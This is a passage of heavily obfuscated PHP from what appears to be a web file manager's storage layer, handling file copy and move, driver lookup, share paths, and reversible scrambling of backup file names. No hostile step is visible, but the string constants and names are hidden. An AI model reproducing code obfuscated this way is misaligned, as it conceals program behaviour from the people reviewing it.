$êåé©€É[12], $¹ôêàü±); if ($®±ÜÂ === $êåé©€É[887]) { return "\140{$¹ôêàü±}\x60"; } return "\x22{$¹ôêàü±}\x22"; } public function mixBakList($Úá»äãñ) { $ÔÜ‰Äˆ =& $_SERVER[¿ÈˆÑ¸ä]; $Úá»äãñ = rtrim($Úá»äãñ, $ÔÜ‰Äˆ[8]) . $ÔÜ‰Äˆ[8]; $€İô‡‹ = $ÔÜ‰Äˆ[1262]; $…‹™¾ğ = IO::listPath($Úá»äãñ); if (empty($…‹™¾ğ[$ÔÜ‰Äˆ[86]])) { return !1; } $´¢êà¿¡ = array(); foreach ($…‹™¾ğ[$ÔÜ‰Äˆ[86]] as $¼ºÑ÷âÈ => $ì˜€ÆñØ) { if (!$ì˜€ÆñØ[$ÔÜ‰Äˆ[32]] || !$ì˜€ÆñØ[$ÔÜ‰Äˆ[87]]) { continue; } $÷Ì»‰ÎÈ = Mcrypt::encode($ì˜€ÆñØ[$ÔÜ‰Äˆ[32]], $€İô‡‹); $ÖóïÜÄ¹ = md5($÷Ì»‰ÎÈ); IO::rename($ì˜€ÆñØ[$ÔÜ‰Äˆ[87]], $ÖóïÜÄ¹); $´¢êà¿¡[$ÖóïÜÄ¹] = $÷Ì»‰ÎÈ; } $šÅ‚İ¸Ò = md5($ÔÜ‰Äˆ[1263] . $€İô‡‹); IO::setContent($Úá»äãñ . $šÅ‚İ¸Ò, json_encode($´¢êà¿¡)); return !0; } public function unmixBakList($óêŞàãú) { $¦ÔŠË³û =& $_SERVER[¿ÈˆÑ¸ä]; $óêŞàãú = rtrim($óêŞàãú, $¦ÔŠË³û[8]) . $¦ÔŠË³û[8]; $‰ ğ®Ïñ = $this->unmixBakListGet($óêŞàãú, !0); if (empty($‰ ğ®Ïñ)) { return !1; } foreach ($‰ ğ®Ïñ as $µ¢Îî†Ä => $èÈ¢‘´) { $ÕÃ²×ş = IO::rename($óêŞàãú . $èÈ¢‘´, $µ¢Îî†Ä); if (!$ÕÃ²×ş) { return !1; } } return !0; } public function unmixBakListGet($…¬˜íÈ, $‚Ô¸¸Æ¿ = false) { $ü¹üÚ½í =& $_SERVER[¿ÈˆÑ¸ä]; $…¬˜íÈ = rtrim($…¬˜íÈ, $ü¹üÚ½í[8]) . $ü¹üÚ½í[8]; $‡ÓÈ“²ø = $ü¹üÚ½í[1262]; $½±Ûƒ¡Ë = md5($ü¹üÚ½í[1263] . $‡ÓÈ“²ø); $¨¢Çû­· = $…¬˜íÈ . $½±Ûƒ¡Ë; if (!IO::exist($¨¢Çû­·)) { return !1; } $¥³ÈÈÎ = json_decode(IO::getContent($¨¢Çû­·), !0); if (empty($¥³ÈÈÎ)) { return !1; } $·‘İÇÍ” = array(); foreach ($¥³ÈÈÎ as $‚ÌÛ£¦§ => $ÅõŞØÔ) { $½±Ûƒ¡Ë = Mcrypt::decode($ÅõŞØÔ, $‡ÓÈ“²ø); $·‘İÇÍ”[$½±Ûƒ¡Ë] = $‚ÌÛ£¦§; } if ($‚Ô¸¸Æ¿) { IO::remove($¨¢Çû­·, !1); } return $·‘İÇÍ”; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($íÆÚ¨ş, $Ù×ë€é¡) { $õ«¦¤è— =& $_SERVER[¿ÈˆÑ¸ä]; $ğÄ³ŠıÆ = $Ù×ë€é¡; $GLOBALS[$õ«¦¤è—[1264]] = $õ«¦¤è—[1265] . $íÆÚ¨ş; Hook::trigger($õ«¦¤è—[1265] . $íÆÚ¨ş . $õ«¦¤è—[1266], $ğÄ³ŠıÆ); $ıßãéÙ” = self::driverMake($Ù×ë€é¡[0]); if (!$ıßãéÙ”) { return !1; } if ($íÆÚ¨ş == $õ«¦¤è—[637] || $íÆÚ¨ş == $õ«¦¤è—[639] || $íÆÚ¨ş == $õ«¦¤è—[1267]) { if (!trim($ıßãéÙ”->path . $õ«¦¤è—[463], $õ«¦¤è—[8])) { return !1; } } if (method_exists($ıßãéÙ”, $íÆÚ¨ş)) { $İšóÒˆ€ = @call_user_func_array(array($ıßãéÙ”, $íÆÚ¨ş), $Ù×ë€é¡); } else { if (method_exists($ıßãéÙ”, $õ«¦¤è—[1268])) { $İšóÒˆ€ = @call_user_func_array(array($ıßãéÙ”, $íÆÚ¨ş), $Ù×ë€é¡); } else { if (method_exists(self, $íÆÚ¨ş)) { $İšóÒˆ€ = @call_user_func_array(array(self, $íÆÚ¨ş), $Ù×ë€é¡); } else { $İšóÒˆ€ = call_user_func_array(array(parent, $íÆÚ¨ş), $Ù×ë€é¡); } } } Hook::trigger($õ«¦¤è—[1265] . $íÆÚ¨ş . $õ«¦¤è—[1269], $ğÄ³ŠıÆ, $İšóÒˆ€); return $İšóÒˆ€; } public static function init($¸ÊŞÏ˜) { return self::driverMake($¸ÊŞÏ˜); } public static function copy($Åå‘¨²î, $æÒ„æ•û, $çîùø‘Â = false, $‰ëŸ»È = false) { return self::copyMoveStart($Åå‘¨²î, $æÒ„æ•û, $çîùø‘Â, $_SERVER[¿ÈˆÑ¸ä][637], $‰ëŸ»È); } public static function move($àÀü¼, $¨Õ˜ç‚¢, $ÕÒµÛçº = false, $ªŒÚÃñ = false) { return self::copyMoveStart($àÀü¼, $¨Õ˜ç‚¢, $ÕÒµÛçº, $_SERVER[¿ÈˆÑ¸ä][639], $ªŒÚÃñ); } public static function copyMoveChildren($èÌã·¦, $©µ×Çâ›, $ˆ‰”íÓ¤ = "\x63\x6f\160\171", $µõÒ×¥“ = REPEAT_REPLACE) { $‡â¾ÉÛÌ =& $_SERVER[¿ÈˆÑ¸ä]; $İÛ•ô = $èÌã·¦; $ºøêü = self::driverMake($èÌã·¦); $¨Èƒ–± = $ºøêü->listPath($èÌã·¦, !0); $ü‡¦§±© = array_merge($¨Èƒ–±[$‡â¾ÉÛÌ[86]], $¨Èƒ–±[$‡â¾ÉÛÌ[85]]); foreach ($ü‡¦§±© as $Æš•ä·) { self::copyMoveStart($Æš•ä·[$‡â¾ÉÛÌ[87]], $©µ×Çâ›, $µõÒ×¥“, $ˆ‰”íÓ¤, !1); } if ($ˆ‰”íÓ¤ == $‡â¾ÉÛÌ[639]) { self::remove($İÛ•ô); } } private static function copyMoveStart($æ„éÌÊ, $ïèãÈàğ, $ŞøÇöø³, $€°ßÂ‹•, $Ş­´ŸÉÙ) { $ ø‘¥Ú° =& $_SERVER[¿ÈˆÑ¸ä]; $×ÜëÄÇğ = array($æ„éÌÊ, $ïèãÈàğ, $ŞøÇöø³, $Ş­´ŸÉÙ); Hook::trigger($ ø‘¥Ú°[1265] . $€°ßÂ‹• . $ ø‘¥Ú°[1266], $×ÜëÄÇğ); $«¯¾ Êº = self::copyMove($æ„éÌÊ, $ïèãÈàğ, $ŞøÇöø³, $€°ßÂ‹•, $Ş­´ŸÉÙ); Hook::trigger($ ø‘¥Ú°[1265] . $€°ßÂ‹• . $ ø‘¥Ú°[1269], $×ÜëÄÇğ, $«¯¾ Êº); return $«¯¾ Êº; } public static function saveFile($Â½™ø¬€, $Ê¨´æáÆ, $á¼œË‰ = true) { $ÒÊ½«Ÿæ =& $_SERVER[¿ÈˆÑ¸ä]; $ÌÀå˜» = self::info($Ê¨´æáÆ); $«¡’ñ = self::driverMake($Â½™ø¬€); $ŸñÔ¾‘ = self::driverMake($Ê¨´æáÆ); $ïüüÄç = !1; if ($ŸñÔ¾‘->pathParse[$ÒÊ½«Ÿæ[1270]]) { $ïüüÄç = $ŸñÔ¾‘; $›À±Ñ— = $ŸñÔ¾‘->pathParse[$ÒÊ½«Ÿæ[1270]]; $ŸñÔ¾‘ = self::driverMake($›À±Ñ—); } if ($«¡’ñ->pathParse[$ÒÊ½«Ÿæ[1270]]) { $¦À·ŞØŸ = $«¡’ñ->pathParse[$ÒÊ½«Ÿæ[1270]]; $«¡’ñ = self::driverMake($¦À·ŞØŸ); } $â¸ŠòÒŞ = $ŸñÔ¾‘->pathFather($Ê¨´æáÆ); $øˆ£éçú = !0; if (!$á¼œË‰ && self::driverIsSame($«¡’ñ, $ŸñÔ¾‘)) { $øˆ£éçú = !1; } $ë‡œö€ = self::copyFile($«¡’ñ, $Â½™ø¬€, $ŸñÔ¾‘, $â¸ŠòÒŞ, $ÌÀå˜»[$ÒÊ½«Ÿæ[32]], $øˆ£éçú); if ($ïüüÄç) { $ë‡œö€ = $ïüüÄç->getPathOuter($ë‡œö€); } return $ë‡œö€; } private static function copyMove($¬äê›Ë¨, $ƒ‚¦¡ø¿, $šäÔç ©, $­ô¦‡¸Ğ, $ºÚĞìæ— = false) { $’óÛğØ½ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$¬äê›Ë¨ || $¬äê›Ë¨ == $’óÛğØ½[8] || !$ƒ‚¦¡ø¿) { return !1; } ignore_timeout(); $Í·ä¶Çû = self::driverMake($¬äê›Ë¨); $ÙêÊÇ» = self::driverMake($ƒ‚¦¡ø¿); $¹ëÕ…ª× = $­ô¦‡¸Ğ == $’óÛğØ½[639]; $Šò÷ÌÚ· = !1; if ($ÙêÊÇ»->pathParse[$’óÛğØ½[1270]]) { $Šò÷ÌÚ· = $ÙêÊÇ»; $ƒ‚¦¡ø¿ = $ÙêÊÇ»->pathParse[$’óÛğØ½[1270]]; $ÙêÊÇ» = self::driverMake($ƒ‚¦¡ø¿); } if ($Í·ä¶Çû->pathParse[$’óÛğØ½[1270]]) { $¬äê›Ë¨ = $Í·ä¶Çû->pathParse[$’óÛğØ½[1270]]; $Í·ä¶Çû = self::driverMake($¬äê›Ë¨); } self::check($Í·ä¶Çû, $¬äê›Ë¨, $ÙêÊÇ», $ƒ‚¦¡ø¿); Hook::trigger($’óÛğØ½[1271], $Í·ä¶Çû, $¬äê›Ë¨, $ÙêÊÇ», $ƒ‚¦¡ø¿); $ï¡åÙ¾¯ = self::driverIsSame($Í·ä¶Çû, $ÙêÊÇ»); if ($ï¡åÙ¾¯) { if ($­ô¦‡¸Ğ == $’óÛğØ½[639] && !method_exists($ÙêÊÇ», $’óÛğØ½[1272]) && trim($ƒ‚¦¡ø¿, $’óÛğØ½[8]) == trim($ÙêÊÇ»->pathFather($¬äê›Ë¨), $’óÛğØ½[8])) { if ($Í·ä¶Çû->pathThis($¬äê›Ë¨) != $ºÚĞìæ— && !$Í·ä¶Çû->isOsDriver()) { return $Í·ä¶Çû->rename($¬äê›Ë¨, $ºÚĞìæ—); } return $ÙêÊÇ»->getPathOuter($¬äê›Ë¨); } if (method_exists($ÙêÊÇ», $­ô¦‡¸Ğ)) { return $ÙêÊÇ»->{$­ô¦‡¸Ğ}($¬äê›Ë¨, $ƒ‚¦¡ø¿, $šäÔç ©, $ºÚĞìæ—); } } if ($ï¡åÙ¾¯ && $­ô¦‡¸Ğ == $’óÛğØ½[639] && $ÙêÊÇ»->getType() == $’óÛğØ½[107]) { $ÏÀİö†² = $ÙêÊÇ»->movePath($¬äê›Ë¨, $ƒ‚¦¡ø¿, $ºÚĞìæ—); if ($ÏÀİö†²) { return $ÏÀİö†²; } } $­”ë‡Ü‘ = $Í·ä¶Çû->isFile($¬äê›Ë¨); if (!$­”ë‡Ü‘ && $ÙêÊÇ»->getType() == $’óÛğØ½[841] && $Í·ä¶Çû->getType() == $’óÛğØ½[107]) { $ÏÀİö†² = $ÙêÊÇ»->copyFolderFromIO($Í·ä¶Çû, $¬äê›Ë¨, $ƒ‚¦¡ø¿, $šäÔç ©, $¹ëÕ…ª×, $ºÚĞìæ—); } else { $ÏÀİö†² = self::copyPath($Í·ä¶Çû, $¬äê›Ë¨, $ÙêÊÇ», $ƒ‚¦¡ø¿, $šäÔç ©, $¹ëÕ…ª×, $­”ë‡Ü‘, $ºÚĞìæ—); } if ($ÏÀİö†² && $¹ëÕ…ª×) { $Í·ä¶Çû->remove($¬äê›Ë¨); } if ($Šò÷ÌÚ·) { $ÏÀİö†² = $Šò÷ÌÚ·->getPathOuter($ÏÀİö†²); } return $ÏÀİö†²; } private static function check($«‰ö“¶á, $³æõàïî, $÷¼é˜•, &$©î´’¥ô) { $¿·›şšğ =& $_SERVER[¿ÈˆÑ¸ä]; if (self::driverIsSame($«‰ö“¶á, $÷¼é˜•) && $«‰ö“¶á->isFolder($³æõàïî) && $«‰ö“¶á->isParentOf($³æõàïî, $©î´’¥ô)) { show_json(LNG($¿·›şšğ[1273]), !1); } if (!$«‰ö“¶á->exist($³æõàïî)) { show_json(LNG($¿·›şšğ[106]), !1); } } private static function copyPath($éùâ¥·, $‡ç•ĞØÅ, $ÕûÆŞ½°, $åÑÀöº», $Ï” ‰¶Š, $÷úÏÙô, $ªÑâ‰–ş, $Âœ¬´ = false, $Æ¶šâù = true) { $Š¿’Ûòæ =& $_SERVER[¿ÈˆÑ¸ä]; $ïŠà…Ş = empty($Âœ¬´) && $Âœ¬´ !== $Š¿’Ûòæ[229] ? $éùâ¥·->pathThis($‡ç•ĞØÅ) : $Âœ¬´; if ($Ï” ‰¶Š) { $¦ ï¾´´ = $ÕûÆŞ½°->fileNameExist($åÑÀöº», $ïŠà…Ş); $ƒœ­Âñó = $ïŠà…Ş; $ïŠà…Ş = $ÕûÆŞ½°->fileNameAuto($åÑÀöº», $ïŠà…Ş, $Ï” ‰¶Š, !$ªÑâ‰–ş); if (!$¦ ï¾´´ || $ƒœ­Âñó != $ïŠà…Ş) { $Ï” ‰¶Š = !1; } if ($Æ¶šâù && !$Ï” ‰¶Š) { $ÕûÆŞ½°->_data[$Š¿’Ûòæ[1274]] = !0; } } if ($ªÑâ‰–ş) { return self::copyFile($éùâ¥·, $‡ç•ĞØÅ, $ÕûÆŞ½°, $åÑÀöº», $ïŠà…Ş, $÷úÏÙô); } if ($Ï” ‰¶Š == REPEAT_RENAME_FOLDER) { $Ï” ‰¶Š = !1; } $™¾¡îÒ† = rtrim($åÑÀöº», $Š¿’Ûòæ[8]) . $Š¿’Ûòæ[8] . $ïŠà…Ş; $…ìõÒˆÂ = $ÕûÆŞ½°->mkdir($ÕûÆŞ½°->getPath($™¾¡îÒ†), $Ï” ‰¶Š); $åÑÀöº» = $ÕûÆŞ½°->getPathInner($…ìõÒˆÂ); $ïù×«Áå = $éùâ¥·->listPath($‡ç•ĞØÅ, !0); $ïù×«Áå = is_array($ïù×«Áå) ? $ïù×«Áå : array($Š¿’Ûòæ[86] => array(), $Š¿’Ûòæ[85] => array()); $Î’†¬ïÖ = array_merge($ïù×«Áå[$Š¿’Ûòæ[86]], $ïù×«Áå[$Š¿’Ûòæ[85]]); foreach ($Î’†¬ïÖ as $ìÅä„ê) { $ôíŸş“© = $ìÅä„ê[$Š¿’Ûòæ[33]] == $Š¿’Ûòæ[231]; $‡ç•ĞØÅ = $éùâ¥·->getPathInner($ìÅä„ê[$Š¿’Ûòæ[87]]); $øş€ºšî = self::copyPath($éùâ¥·, $‡ç•ĞØÅ, $ÕûÆŞ½°, $åÑÀöº», $Ï” ‰¶Š, $÷úÏÙô, $ôíŸş“©, !1, !1); if (!$øş€ºšî) { IO::errorTips($Š¿’Ûòæ[1275] . $‡ç•ĞØÅ . $Š¿’Ûòæ[73] . $åÑÀöº»); } } self::copyMoveKeepInfo($éùâ¥·, $‡ç•ĞØÅ, $…ìõÒˆÂ); return $…ìõÒˆÂ; } private static function copyFile($Ú÷Õöù, $½‹£®î¼, $²Õ©¸õæ, $–®Êë‰°, $£Üà‘®, $„çˆç÷ğ) { $œ“¥™¡ğ =& $_SERVER[¿ÈˆÑ¸ä]; $–®Êë‰° = $²Õ©¸õæ->getPath(rtrim($–®Êë‰°, $œ“¥™¡ğ[8]) . $œ“¥™¡ğ[8] . $£Üà‘®); $¢ê¶ÓÎ¢ = $œ“¥™¡ğ[1276] . time() . rand_string(5); Hook::trigger($œ“¥™¡ğ[1277], $Ú÷Õöù, $½‹£®î¼, $²Õ©¸õæ, $–®Êë‰°, $£Üà‘®, $¢ê¶ÓÎ¢); if (self::driverIsSame($Ú÷Õöù, $²Õ©¸õæ)) { if ($„çˆç÷ğ) { $­Ä¨ƒéÂ = $²Õ©¸õæ->moveFile($½‹£®î¼, $–®Êë‰°); } else { $­Ä¨ƒéÂ = $²Õ©¸õæ->copyFile($½‹£®î¼, $–®Êë‰°); } Hook::trigger($œ“¥™¡ğ[1278], $Ú÷Õöù, $½‹£®î¼, $²Õ©¸õæ, $–®Êë‰°, $£Üà‘®, $­Ä¨ƒéÂ); self::copyMoveKeepInfo($Ú÷Õöù, $½‹£®î¼, $­Ä¨ƒéÂ); return $­Ä¨ƒéÂ; } $£şÇÔı¤ = TEMP_FILES; if ($GLOBALS[$œ“¥™¡ğ[6]][$œ“¥™¡ğ[92]][$œ“¥™¡ğ[884]]) { $£şÇÔı¤ = $GLOBALS[$œ“¥™¡ğ[6]][$œ“¥™¡ğ[92]][$œ“¥™¡ğ[884]]; } $ó÷„ÙŠå = $£şÇÔı¤; mk_dir($ó÷„ÙŠå); $÷°”„ğ = $ó÷„ÙŠå . $¢ê¶ÓÎ¢; $³ÒçÊæ = $÷°”„ğ; $÷°”„ğ = $Ú÷Õöù->download($½‹£®î¼, $÷°”„ğ); $÷°”„ğ = $Ú÷Õöù->iconvApp($÷°”„ğ); if (substr($÷°”„ğ, strlen($£şÇÔı¤)) == $£şÇÔı¤) { $„çˆç÷ğ = !0; } $­Ä¨ƒéÂ = $²Õ©¸õæ->upload($–®Êë‰°, $÷°”„ğ, $„çˆç÷ğ); self::remove($³ÒçÊæ); Hook::trigger($œ“¥™¡ğ[1278], $Ú÷Õöù, $½‹£®î¼, $²Õ©¸õæ, $–®Êë‰°, $£Üà‘®, $­Ä¨ƒéÂ); self::copyMoveKeepInfo($Ú÷Õöù, $½‹£®î¼, $­Ä¨ƒéÂ); return $­Ä¨ƒéÂ; } private static function copyMoveKeepInfo($îƒ©ê—Œ, $¨ÍÂŠ¿Ğ, $Âç¿Ìøû) { if (!$Âç¿Ìøû) { return; } $ªˆúù ¯ = $îƒ©ê—Œ->info($¨ÍÂŠ¿Ğ); if (!is_array($ªˆúù ¯)) { return; } IO::setModifyTime($Âç¿Ìøû, $ªˆúù ¯[$_SERVER[¿ÈˆÑ¸ä][88]]); } public static function pathFather($šÜÇóÕ¦) { $×ÃØÆñ¬ = IO::init($šÜÇóÕ¦); $´ñÒÌ¸ù = $×ÃØÆñ¬->pathFather($×ÃØÆñ¬->path); return $×ÃØÆñ¬->getPathOuter($´ñÒÌ¸ù); } public static function fileOut($ÙÎ§îÀ, $şÜêÎ€½ = false, $åŸÏŞö« = false, $å¹¯¦Ä» = '') { $³şúé³ı = self::driverMake($ÙÎ§îÀ); if ($³şúé³ı->isFileOutServer()) { return $³şúé³ı->fileOutServer($ÙÎ§îÀ, $şÜêÎ€½, $åŸÏŞö«, $å¹¯¦Ä»); } return $³şúé³ı->fileOut($ÙÎ§îÀ, $şÜêÎ€½, $åŸÏŞö«, $å¹¯¦Ä»); } public static function fileOutImage($¶‚Œçß, $­İ»ÏãŠ = 250) { $¨·„¥ÕÑ = array(250, 600, 1200, 2000, 3000, 5000); for ($··¾®—° = 0; $··¾®—° < count($¨·„¥ÕÑ); $··¾®—°++) { if ($··¾®—° == 0 && $­İ»ÏãŠ <= $¨·„¥ÕÑ[$··¾®—°]) { $­İ»ÏãŠ = $¨·„¥ÕÑ[$··¾®—°]; break; } else { if ($­İ»ÏãŠ > $¨·„¥ÕÑ[$··¾®—° - 1] && $­İ»ÏãŠ <= $¨·„¥ÕÑ[$··¾®—°]) { $­İ»ÏãŠ = $¨·„¥ÕÑ[$··¾®—°]; break; } else { if ($··¾®—° == count($¨·„¥ÕÑ) - 1 && $­İ»ÏãŠ > $¨·„¥ÕÑ[$··¾®—°]) { $­İ»ÏãŠ = $¨·„¥ÕÑ[$··¾®—°]; break; } } } } $ÒÖ€Äª« = self::driverMake($¶‚Œçß); if ($ÒÖ€Äª«->isFileOutServer()) { return $ÒÖ€Äª«->fileOutImageServer($¶‚Œçß, $­İ»ÏãŠ); } return $ÒÖ€Äª«->fileOutImage($¶‚Œçß, $­İ»ÏãŠ); } private static function driverIsSame($¯÷èÕ¡, $¶ÕâàÏÁ) { $ŞÛƒ³ß€ =& $_SERVER[¿ÈˆÑ¸ä]; $ïÎ¼õ–Ï = $¯÷èÕ¡->getType(); $ÇçÛá®ù = $¶ÕâàÏÁ->getType(); if ($ïÎ¼õ–Ï != $ÇçÛá®ù) { return !1; } if ($ïÎ¼õ–Ï == $ŞÛƒ³ß€[841]) { return !0; } if ($ïÎ¼õ–Ï == $ŞÛƒ³ß€[107]) { return !0; } if ($¯÷èÕ¡->pathDriver == $¶ÕâàÏÁ->pathDriver) { return !0; } return !1; } public static function copyUpdate($ÒŞËÌáü, $êé…ÙŠ§) { $ªöîÊ£Î =& $_SERVER[¿ÈˆÑ¸ä]; if (!IO::exist($ÒŞËÌáü)) { return !1; } if (!IO::exist($êé…ÙŠ§)) { IO::mkdir($êé…ÙŠ§); } $ÒÎ‰à¨— = array_to_keyvalue(self::listAllSimple($ÒŞËÌáü), $ªöîÊ£Î[87]); $ÆÄ³¥¥÷ = array_to_keyvalue(self::listAllSimple($êé…ÙŠ§), $ªöîÊ£Î[87]); $”—µ‘‚õ = array(); $ôÖĞıƒ¡ = array(); foreach ($ÒÎ‰à¨— as $¤õ˜Áµ => $íÏ‘êêò) { if (isset($ÆÄ³¥¥÷[$¤õ˜Áµ])) { if ($íÏ‘êêò[$ªöîÊ£Î[78]] == 1) { continue; } if ($ÆÄ³¥¥÷[$¤õ˜Áµ][$ªöîÊ£Î[79]] == $íÏ‘êêò[$ªöîÊ£Î[79]]) { continue; } } if ($íÏ‘êêò[$ªöîÊ£Î[78]] == 1) { $ôÖĞıƒ¡[] = $êé…ÙŠ§ . $ªöîÊ£Î[8] . trim($¤õ˜Áµ, $ªöîÊ£Î[8]); continue; } $ÛÖäİıß = strstr(trim($¤õ˜Áµ, $ªöîÊ£Î[8]), $ªöîÊ£Î[8]) ? get_path_father($¤õ˜Áµ) : $ªöîÊ£Î[12]; $”—µ‘‚õ[] = array($ªöîÊ£Î[1279] => $íÏ‘êêò[$ªöîÊ£Î[89]], $ªöîÊ£Î[1280] => rtrim($êé…ÙŠ§, $ªöîÊ£Î[8]) . $ªöîÊ£Î[8] . $ÛÖäİıß, $ªöîÊ£Î[1281] => $íÏ‘êêò); } $¥ùµÀ¶£ = array($ªöîÊ£Î[231] => $”—µ‘‚õ, $ªöîÊ£Î[78] => $ôÖĞıƒ¡); Hook::trigger($ªöîÊ£Î[1282], $ÒŞËÌáü, $êé…ÙŠ§, $¥ùµÀ¶£); foreach ($ôÖĞıƒ¡ as $íÏ‘êêò) { IO::mkdir($íÏ‘êêò); } foreach ($”—µ‘‚õ as $íÏ‘êêò) { IO::copy($íÏ‘êêò[$ªöîÊ£Î[1279]], $íÏ‘êêò[$ªöîÊ£Î[1280]], REPEAT_REPLACE); } } public static function fileSubstr($ˆ“ÃûÈù, $““ßêÂ†, $şÉ˜äæ = false) { $ç‰²¼şº =& $_SERVER[¿ÈˆÑ¸ä]; $¤‘ñ·Íâ = self::driverMake($ˆ“ÃûÈù); $ÀìÊÓ¬„ = $¤‘ñ·Íâ->size($ˆ“ÃûÈù); $â³–¬º§ = $““ßêÂ†; $ÖåÆ¤‹ = $şÉ˜äæ; if ($““ßêÂ† < 0) { $““ßêÂ† = $ÀìÊÓ¬„ + $““ßêÂ†; } if ($şÉ˜äæ === !1) { $şÉ˜äæ = $ÀìÊÓ¬„ - $““ßêÂ†; } if ($““ßêÂ† + $şÉ˜äæ > $ÀìÊÓ¬„) { $şÉ˜äæ = $ÀìÊÓ¬„ - $““ßêÂ†; } if (!$ÀìÊÓ¬„ && $¤‘ñ·Íâ->getType() == $ç‰²¼şº[107] && !$¤‘ñ·Íâ->exist($ˆ“ÃûÈù)) { $Áñı¥á¿ = get_path_this($ˆ“ÃûÈù); $à…¬¨™Ú = parse_url_query($Áñı¥á¿); if (is_array($à…¬¨™Ú) && isset($à…¬¨™Ú[$ç‰²¼şº[32]])) { $Áñı¥á¿ = urldecode($à…¬¨™Ú[$ç‰²¼şº[32]]); } throw new Exception($ç‰²¼şº[1283] . LNG($ç‰²¼şº[1284]) . $ç‰²¼şº[1069] . clear_html($Áñı¥á¿) . $ç‰²¼şº[12]); } if ($şÉ˜äæ <= 0) { return $ç‰²¼şº[12]; } if ($““ßêÂ† < 0 || $““ßêÂ† >= $ÀìÊÓ¬„ || $şÉ˜äæ > $GLOBALS[$ç‰²¼şº[6]][$ç‰²¼şº[92]][$ç‰²¼şº[1285]]) { throw new Exception("\x66\151\x6c\x65\x52\x65\x61\144\x20\x65\162\x72\x6f\162\54\157\x76\145\162\40\151\x6f\122\x65\x61\144\x4d\x61\170\x21\40\x73\164\x61\162\164\x3d{$““ßêÂ†}\x3b\x6c\145\156\147\x74\x68\x3d{$şÉ˜äæ}\x3b\40\163\151\172\145\75{$ÀìÊÓ¬„}\x3b"); } $Öšó‘¹Ô = $¤‘ñ·Íâ->fileSubstr($ˆ“ÃûÈù, $““ßêÂ†, $şÉ˜äæ); if (!$Öšó‘¹Ô && $şÉ˜äæ && isset($GLOBALS[$ç‰²¼şº[1286]])) { throw new Exception($GLOBALS[$ç‰²¼şº[1286]][$ç‰²¼şº[1287]]); } return $Öšó‘¹Ô; } private static function driverMake(&$Ò×Ô˜Àì) { $°â’•œ¶ =& $_SERVER[¿ÈˆÑ¸ä]; $§İ•Ñ« = KodIO::parse($Ò×Ô˜Àì); if (!self::$driverListSystem) { $É èô˜À = Model($°â’•œ¶[851])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($É èô˜À, $°â’•œ¶[483]); } if ($§İ•Ñ«[$°â’•œ¶[33]] == KodIO::KOD_IO && !self::$driverListSystem[$§İ•Ñ«[$°â’•œ¶[483]]]) { throw new Exception($°â’•œ¶[1288]); return !1; } $Ò×Ô˜Àì = $§İ•Ñ«[$°â’•œ¶[1289]]; $÷ô«Àê’ = self::driverGet($§İ•Ñ«, $Ò×Ô˜Àì); return $÷ô«Àê’; } private static function driverGet($ù“´îï, &$Ò†¤¶›ã) { $¡”éûÀõ =& $_SERVER[¿ÈˆÑ¸ä]; $ìÃÈåŠ = $ù“´îï[$¡”éûÀõ[1290]]; $ğàæı† = $ù“´îï[$¡”éûÀõ[483]]; switch ($ù“´îï[$¡”éûÀõ[33]]) { case KodIO::KOD_IO: $ƒ¶¾öáæ = self::$driverListSystem[$ğàæı†]; break; case KodIO::KOD_SOURCE: $Ò†¤¶›ã = $ğàæı† . $Ò†¤¶›ã; $ƒ¶¾öáæ = array($¡”éûÀõ[1291] => $¡”éûÀõ[1292], $¡”éûÀõ[6] => $ù“´îï); $ƒ¶¾öáæ[$¡”éûÀõ[6]][$¡”éûÀõ[1293]] = $ù“´îï[$¡”éûÀõ[483]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Øı„ÊÉ = $GLOBALS[$¡”éûÀõ[1294]]; self::$driverListUser = array_to_keyvalue($Øı„ÊÉ, $¡”éûÀõ[483]); } $ƒ¶¾öáæ = self::$driverListUser[$ğàæı†]; break; case KodIO::KOD_SHARE_LINK: $ƒ¶¾öáæ = array($¡”éûÀõ[1291] => $¡”éûÀõ[1295], $¡”éûÀõ[6] => $ù“´îï); $ßÆÕŠÈÊ = Action($¡”éûÀõ[1296])->sharePathInfo($ù“´îï[$¡”éûÀõ[87]]); $Ò†¤¶›ã = $ßÆÕŠÈÊ[$¡”éûÀõ[192]]; if (!$ßÆÕŠÈÊ[$¡”éûÀõ[192]]) { $ËÒ¢Í¹Ñ = Model($¡”éûÀõ[683])->getInfo($ßÆÕŠÈÊ[$¡”éûÀõ[684]]); $Ò†¤¶›ã = KodIO::clear($ËÒ¢Í¹Ñ[$¡”éûÀõ[579]] . $ù“´îï[$¡”éûÀõ[1289]]); $ù“´îï[$¡”éûÀõ[572]] = $ËÒ¢Í¹Ñ; $ù“´îï[$¡”éûÀõ[1270]] = $Ò†¤¶›ã; $ƒ¶¾öáæ = array($¡”éûÀõ[1291] => $¡”éûÀõ[1297], $¡”éûÀõ[6] => $ù“´îï); } else { $ƒ¶¾öáæ[$¡”éûÀõ[6]][$¡”éûÀõ[1293]] = $ßÆÕŠÈÊ[$¡”éûÀõ[192]]; } break; case KodIO::KOD_SHARE_ITEM: $ƒ¶¾öáæ = array($¡”éûÀõ[1291] => $¡”éûÀõ[1298], $¡”éûÀõ[6] => $ù“´îï); $ËÒ¢Í¹Ñ = Model($¡”éûÀõ[683])->getInfo($ù“´îï[$¡”éûÀõ[483]]); if ($ËÒ¢Í¹Ñ[$¡”éûÀõ[192]] == $¡”éûÀõ[229]) { $Ò†¤¶›ã = KodIO::clear($ËÒ¢Í¹Ñ[$¡”éûÀõ[579]] . $ù“´îï[$¡”éûÀõ[1289]]); $ù“´îï[$¡”éûÀõ[572]] = $ËÒ¢Í¹Ñ; $ù“´îï[$¡”éûÀõ[1270]] = $Ò†¤¶›ã; $ƒ¶¾öáæ = array($¡”éûÀõ[1291] => $¡”éûÀõ[1299], $¡”éûÀõ[6] => $ù“´îï); } else { if (!$Ò†¤¶›ã) { $Ò†¤¶›ã = $ËÒ¢Í¹Ñ[$¡”éûÀõ[192]]; } $ƒ¶¾öáæ[$¡”éûÀõ[6]][$¡”éûÀõ[1293]] = $ËÒ¢Í¹Ñ[$¡”éûÀõ[192]]; } break; case KodIO::KOD_SHARE_OUTER: $ƒ¶¾öáæ = array($¡”éûÀõ[1291] => $¡”éûÀõ[1300], $¡”éûÀõ[6] => $ù“´îï); break; default: $Ò†¤¶›ã = $ù“´îï[$¡”éûÀõ[87]]; $ƒ¶¾öáæ = array($¡”éûÀõ[1291] => 